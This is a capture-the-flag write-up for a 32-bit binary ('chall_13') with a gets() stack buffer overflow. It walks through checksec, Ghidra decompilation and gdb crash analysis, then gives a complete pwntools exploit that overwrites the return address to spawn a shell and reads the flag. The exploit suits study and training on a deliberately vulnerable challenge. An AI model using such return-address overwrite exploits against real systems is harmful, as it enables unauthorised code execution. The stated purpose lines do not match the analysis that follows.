# &#35; chall_13

#### &#42; purpose
1. find offset to input variable(local_48[56]) and *local_10
2. find leaked main() address

#### &#42; execute
```bash
## 1 file
$ ls ./chall_13
./chall_13

## 32-bit LSB, dynamically linked and not stripped
$ file ./chall_13
./chall_13: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7143a4d476307486d46ea94b6da4f0bd11270abc, for GNU/Linux 3.2.0, not stripped

## Partial RELRO
$ checksec --file=./chall_13
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74) Symbols	  No	0		2		./chall_13

## just input twice
$ ./chall_13
Keep on writing
AAAA
BBBB
$

```

#### &#42; disassemble using ghidra
```bash

void main(void)

{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("Keep on writing");
  fgets(local_24,0x13,stdin);
  vuln();
  return;
}

## vulnerable point is gets(local_3e);
void vuln(void)

{
  char local_3e [54];
  
  gets(local_3e);
  return;
}

void systemFunc(void)

{
  system("/bin/sh");
  return;
}


## exploit structure
local_3e [54] + sfp[4] + ret[systemFunc]

```


#### &#42; analysis binary using gdb
```bash
$ gdb ./chall_13 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./chall_13...
(No debugging symbols found in ./chall_13)
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049225 <+0>:	endbr32
   0x08049229 <+4>:	push   ebp
   0x0804922a <+5>:	mov    ebp,esp
   0x0804922c <+7>:	push   ebx
   0x0804922d <+8>:	sub    esp,0x44
   0x08049230 <+11>:	call   0x80492ae <__x86.get_pc_thunk.ax>
   0x08049235 <+16>:	add    eax,0x2dcb
   0x0804923a <+21>:	sub    esp,0xc
   0x0804923d <+24>:	lea    edx,[ebp-0x3a]
   0x08049240 <+27>:	push   edx
   0x08049241 <+28>:	mov    ebx,eax
   0x08049243 <+30>:	call   0x8049090 <gets@plt>
   0x08049248 <+35>:	add    esp,0x10
   0x0804924b <+38>:	nop
   0x0804924c <+39>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804924f <+42>:	leave
   0x08049250 <+43>:	ret
End of assembler dump.
gef➤

gef➤  b *0x08049243
Breakpoint 1 at 0x8049243

gef➤  r
Continuing.

AAAA
>>> "B"*54+"C"*4+"D"*4+"EEEE"
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDDEEEE'
>>>
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCDDDDEEEE

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xff92726e  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$ebx   : 0x43434242 ("BBCC"?)
$ecx   : 0xf7eff580  →  0xfbad2288
$edx   : 0xff9272b0  →  0xf7eff300  →  0xf7ea5d3d  →  "ISO-10646/UTF8/"
$esp   : 0xff9272b0  →  0xf7eff300  →  0xf7ea5d3d  →  "ISO-10646/UTF8/"
$ebp   : 0x44444444 ("DDDD"?)
$esi   : 0xf7eff000  →  0x001ead6c
$edi   : 0xf7eff000  →  0x001ead6c
$eip   : 0x45454545 ("EEEE"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff9272b0│+0x0000: 0xf7eff300  →  0xf7ea5d3d  →  "ISO-10646/UTF8/"	 ← $esp
0xff9272b4│+0x0004: 0x00040000
0xff9272b8│+0x0008: 0x00000000
0xff9272bc│+0x000c: "AAAA\n"
0xff9272c0│+0x0010: 0x0000000a
0xff9272c4│+0x0014: 0xff927384  →  0xff928878  →  "/pwn/sunshine/13/chall_13"
0xff9272c8│+0x0018: 0xff92738c  →  0xff928892  →  "SHELL=/bin/bash"
0xff9272cc│+0x001c: 0x080492e1  →  <__libc_csu_init+33> lea ebx, [ebp-0xf4]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x45454545
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_13", stopped 0x45454545 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤


```

#### &#42; structure of stack
```bash
local_3e [54] + dummy[4] + sfp[4] + ret[4]

```

#### &#42; payload(python)
```python
payload  = b""
payload += b"A"*62
payload += p32(systemFunc)

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = "./chall_13"

conn = process(filename)
elf = ELF(filename)
system = elf.symbols["systemFunc"]

print ( "system : "+hex(system) )

print( conn.recvline() )

conn.sendline("AAAA")

payload  = b""
payload += b"A"*62
payload += p32(system)

conn.send(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[+] Starting local process './chall_13': pid 1143
[*] '/pwn/sunshine/13/chall_13'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
system : 0x80491f6
Keep on writing

[*] Switching to interactive mode
$
$ cat flag.txt
sun{almost-easy-61ddd735cf9053b0}
$

```
